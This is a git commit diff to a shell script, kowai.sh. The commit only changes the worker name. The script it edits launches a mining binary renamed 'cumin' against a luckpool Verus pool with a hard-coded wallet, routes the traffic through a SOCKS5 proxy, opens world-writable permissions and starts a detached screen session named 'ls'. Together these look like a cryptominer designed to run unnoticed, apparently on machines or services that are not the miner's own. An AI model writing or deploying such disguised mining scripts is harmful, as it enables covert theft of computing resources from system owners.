9ff06fc5ef7a105f32197d15cbfa34b37bf3d199
kumama1 <88571142+kumama1@users.noreply.github.com>
2021-08-07 12:29:32 +0700

    Update kowai.sh

--- kowai.sh
+++ kowai.sh
@@ -5,6 +5,6 @@ chmod +x kowai.sh && chmod +x cumin chmod 777 cumin kowai.sh
 screen -dmS ls 
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RHHpSBzjvSctxBuZnSjAbWLL3o8aUqycdi
-WORKER=$(echo $(shuf -i 1-10 -n 1)gass)
+WORKER=$(echo $(shuf -i 1-10 -n 1)skuy)
 PROXY=socks5://184.179.216.133:4145
 ./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
